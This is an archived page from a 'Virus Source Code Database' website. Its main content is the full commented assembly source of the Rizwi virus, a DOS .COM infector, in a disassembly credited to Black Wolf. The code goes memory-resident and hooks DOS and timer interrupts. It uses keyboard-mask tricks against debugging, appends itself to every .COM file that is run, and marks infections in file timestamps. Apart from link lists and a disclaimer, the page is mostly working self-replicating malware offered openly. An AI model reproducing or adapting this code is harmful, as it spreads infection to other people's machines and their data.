<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: rizwi_asm</title>
<meta name="KEYWORDS" content="rizwi.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for rizwi.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="rage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rage_asm.php">rage_asm</a><br>
<a href="rammonst_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rammonst_asm.php">rammonst_asm</a><br>
<a href="rand_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rand_asm.php">rand_asm</a><br>
<a href="ranger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ranger_asm.php">ranger_asm</a><br>
<a href="rapbetr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapbetr_asm.php">rapbetr_asm</a><br>
<a href="rape1882_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape1882_asm.php">rape1882_asm</a><br>
<a href="rapeiib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapeiib_asm.php">rapeiib_asm</a><br>
<a href="rape_v20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape_v20_asm.php">rape_v20_asm</a><br>
<a href="rausr757_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rausr757_asm.php">rausr757_asm</a><br>
<a href="ravage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ravage_asm.php">ravage_asm</a><br>
<a href="raver_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raver_asm.php">raver_asm</a><br>
<a href="raygun2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun2_asm.php">raygun2_asm</a><br>
<a href="raygun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun_asm.php">raygun_asm</a><br>
<a href="readvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/readvir_asm.php">readvir_asm</a><br>
<a href="rec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rec_asm.php">rec_asm</a><br>
<a href="red_merc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/red_merc_asm.php">red_merc_asm</a><br>
<a href="redmerc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redmerc_asm.php">redmerc_asm</a><br>
<a href="redx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redx_asm.php">redx_asm</a><br>
<a href="replic_d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/replic_d_asm.php">replic_d_asm</a><br>
<a href="republic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/republic_asm.php">republic_asm</a><br>
<a href="retal1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal1_asm.php">retal1_asm</a><br>
<a href="retal2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal2_asm.php">retal2_asm</a><br>
<a href="retal3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal3_asm.php">retal3_asm</a><br>
<a href="retal4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal4_asm.php">retal4_asm</a><br>
<a href="reyes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/reyes_asm.php">reyes_asm</a><br>
<a href="richard__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richard__asm.php">richard__asm</a><br>
<a href="richards_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richards_asm.php">richards_asm</a><br>
<a href="riot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riot_asm.php">riot_asm</a><br>
<a href="rip_hd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rip_hd_asm.php">rip_hd_asm</a><br>
<a href="ritzen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ritzen_asm.php">ritzen_asm</a><br>
<a href="riverbot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riverbot_asm.php">riverbot_asm</a><br>
<a href="rizwi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rizwi_asm.php">rizwi_asm</a><br>
<a href="rna_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rna_pas.php">rna_pas</a><br>
<a href="rnd__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd__asm.php">rnd__asm</a><br>
<a href="rnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_asm.php">rnd_asm</a><br>
<a href="rnd_num_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_num_asm.php">rnd_num_asm</a><br>
<a href="romulan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/romulan_asm.php">romulan_asm</a><br>
<a href="roseanne_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roseanne_asm.php">roseanne_asm</a><br>
<a href="roz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roz_asm.php">roz_asm</a><br>
<a href="rtl4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rtl4_asm.php">rtl4_asm</a><br>
<a href="runt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_asm.php">runt_asm</a><br>
<a href="runt_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_b_asm.php">runt_b_asm</a><br>
<a href="runt-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt-b_asm.php">runt-b_asm</a><br>
<a href="rush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_asm.php">rush_asm</a><br>
<a href="rushhour_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhour_asm.php">rushhour_asm</a><br>
<a href="rushhr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhr_asm.php">rushhr_asm</a><br>
<a href="rush_vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_vir_asm.php">rush_vir_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;Rizwi Virus from the TridenT research group.  
;Memory resident .COM infector.

;This virus is only active after the spring of 1994.
;When active,  it infects .COM files on execution, and keeps
;track of the number of files that it has infected.  While it has
;infected between 0C8h and 0f0h files, it displays the message
;that " Righard Zwienenberg made the DUTCH-555 virus!!! " on
;the screen.

;This virus has some anti-debugging code, as it masks the keyboard
;interrupt and checks to see if it remaines masked, so when debugging
;through it one must jump over these sections of code (In/Out port 21h
;and the checking of ax accompanying them).

;Disassembly by Black Wolf
  
.model tiny
.code

		org     100h
  
start:
		call    Get_Offset
Get_Offset:
		pop     bp
		sub     bp,offset Get_Offset
		
		mov     ah,30h
		int     21h                     ;Get Dos version/Install Check
			   
		cmp     bx,4243h
		je      DoneInstall             ;Already Installed

		mov     ah,2Ah
		int     21h                     ;Get date
			      
		in      al,21h                  ;Read interrupt masks...
		
		cmp     cx,1993                 ;Is year later than 1993?
		ja      GoMemRes                ;If not, exit.

		cmp     dh,4
		ja      GoMemRes                ;Is month < May, exit.
DoneInstall:
		db      0e9h,74h,0              ;jmp     ReturnToHost

GoMemRes:
		or      al,2
		push    ax
		mov     ax,351Ch
		int     21h                  ;Get timer interrupt
			   
		mov     cs:[Int1cIP+bp],bx
		mov     cs:[Int1cCS+bp],es
		
		pop     ax
		out     21h,al               ;Interrupt - disable keyboard?

SetInterrupts:
		mov     ax,3521h
		int     21h                     ;Get int 21 address
			    
		mov     word ptr cs:[OldInt21+bp],bx       
		mov     word ptr cs:[OldInt21+2+bp],es
		in      al,21h                 
		and     al,2
		push    ax
		
		mov     ax,cs
		dec     ax
		mov     ds,ax                   ;Set DS = MCB
		cmp     byte ptr ds:0,'Z'       ;Are we at the end of the 
		jne     ReturnToHost            ;memory chain?

		;sub     word ptr ds:[3],27h     ;Decrease MCB size
		db      81h,2eh,03,0,27h,0  

		;sub     word ptr ds:[12h],27h   ;Decrease PSP top of memory
		db      81h,2eh,12h,0,27h,0  
		
		lea     si,[bp+100h]            ;SI = beginning of virus
		mov     di,100h                 ;DI = new offset (100h)
		
		pop     ax
		cmp     al,2                    ;Did someone skip interrupt
		jne     SetInterrupts           ;disabling code?  If so,
						;loop them back to redo
						;interrupt setting.
				      

		mov     ax,ds:[12h]             ;Get free segment
		sub     ax,10h                  ;Subtract 10h to account for
		mov     es,ax                   ; offset of 100h
		mov     cx,263h
		push    cs
		pop     ds
		rep     movsb                   ;Copy virus into memory
		in      al,21h             
		xor     al,2                    
		push    es
		pop     ds
		out     21h,al                  ;Do the keyboard int again...

		mov     ax,251Ch
		mov     dx,offset Int1cHandler
		int     21h                     ;Set int 1ch
					 

		mov     ax,2521h
		mov     dx,offset Int21Handler
		int     21h                     ;Set int 21h
				      
ReturnToHost:
		push    cs                      ;Restore Seg regs
		pop     ds
		push    ds
		pop     es
		mov     di,100h
		push    di
		lea     si,[bp+Storage_Bytes]            ;Storage bytes
		movsw
		movsb                           ;Restore host
		ret


Storage_Bytes:          
		int     20h
		popf
		
TridenT_ID      db      '[TridenT]'
  
FakeInt21h:
		pushf                          
		call    dword ptr cs:OldInt21     ;Fake Interrupt 21h
		retn

  
VirusVersion    db      '{V1.1 Bugfix}'

OldInt21        dw      0, 0
				
Int21Handler:                
		cmp     ax,4b00h
		je      IsExecute
		cmp     ah,30h
		jnz     ExitInt21
		call    FakeInt21h
		mov     bx,4243h
		iret

ExitInt21:
		jmp     dword ptr cs:OldInt21

IsExecute:
		push    ax bx cx dx si di ds es bp ds dx
		
		mov     ax,4300h
		call    FakeInt21h      ;Get attributes
		
		mov     FileAttribs,cx  ;Save them
		xor     cx,cx     
		mov     ax,4301h        ;Reset Attributes
		call    FakeInt21h      

		mov     ax,3D02h        ;Open file
		call    FakeInt21h

		mov     Filehandle,ax      
		xchg    ax,bx
		mov     ax,5700h
		call    FakeInt21h      ;Get file date/time
		mov     cs:[FileTime],cx  ;  and save them
		mov     cs:[FileDate],dx 
		and     cx,1Fh
		cmp     cx,1Fh          ;Check infection in time stamp
		jne     Infect_File


CloseFile:
		mov     ah,3Eh
		call    FakeInt21h
		
		pop     dx              ;Pop filename address
		pop     ds
		mov     cx,FileAttribs
		mov     ax,4301h        
		call    FakeInt21h      ;Reset Attributes
		
		db      0e9h, 67h, 0    ;jmp     DoneInfect

Infect_File:
		mov     ah,3Fh
		push    cs
		pop     ds
		mov     dx,offset Storage_Bytes
		mov     cx,3
		call    FakeInt21h              ;Read in first 3 bytes

		cmp     word ptr cs:[Storage_Bytes],4D5Ah  ;Is EXE?
		je      CloseFile      
		cmp     word ptr cs:[Storage_Bytes],5A4Dh  ;Is alternate EXE?
		je      CloseFile      

		mov     ax,4202h
		xor     cx,cx
		xor     dx,dx
		call    FakeInt21h              ;Go to the end of file
		
		sub     ax,3                    ;adjust size for jump
		mov     word ptr [JumpSize],ax  ;save jump size
		
		mov     ah,40h    
		mov     dx,100h
		mov     cx,263h
		call    FakeInt21h              ;Append Virus to host

		mov     ax,4200h
		xor     cx,cx   
		xor     dx,dx                   ;Go to beginning
		call    FakeInt21h              ;of host file.

		mov     ah,40h                  
		mov     dx,358h
		mov     cx,3
		call    FakeInt21h              ;Write Jump bytes
		
		mov     ax,5701h
		mov     cx,[FileTime]
		mov     dx,[FileDate]
		or      cx,1Fh                  ;Mark infection in time stamp
		call    FakeInt21h              ;Restore time/date

		inc     byte ptr cs:[Counter]   ;Activation counter...
		jmp     short CloseFile

DoneInfect:
		pop     bp es ds di si dx cx bx ax
		jmp     ExitInt21

Int1cIP         dw      0    
Int1cCS         dw      0    

Int1cHandler:                ;While infections are between C8h and F0h,
			     ;Stick message on screen every once in a while.
		pushf
		push    ax cx si di ds es
		cmp     byte ptr cs:[Counter],0C8h
		jb      ExitInt1c
		cmp     byte ptr cs:[Counter],0F0h
		ja      ExitInt1c                  
		cmp     word ptr cs:[TimerCount],5000h
		je      WriteMessageToScreen            
		inc     word ptr cs:[TimerCount]
		
		db      0e9h,16h,0              ;jmp     ExitInt1c             

WriteMessageToScreen:
		push    cs
		pop     ds
		mov     ax,0B800h             ;Text Screen memory
		mov     es,ax
		mov     si,offset Message
		mov     di,0A0h
		db      81h,0efh,62h,0        ;sub     di,EndMessage-Message
		mov     cx,EndMessage-Message
		rep     movsb

ExitInt1c:
		pop     es ds di si cx ax
		popf
		iret
	
;Message says " Righard Zwienenberg made the DUTCH-555 virus!!! "
;Capital O's are attribute values....

Message:   
		db      ' OROiOgOhOaOrOdO OZOwOiOeOnOeOnO'
		db      'bOeOrOgO OmOaOdOeO OtOhOeO ODOUO'
		db      'TOCOHO-O5O5O5O OVOiOrOuOsO!O!O!O'
		db      ' O'
EndMessage:

Counter         db      0
		
TimerCount      dw      0

JumpBytes       db      0E9h
JumpSize        dw      0

FileAttribs     dw      0
Filehandle      dw      0
FileDate        dw      0
FileTime        dw      0

end     start
	       

</textarea></td></tr></table></body></html>
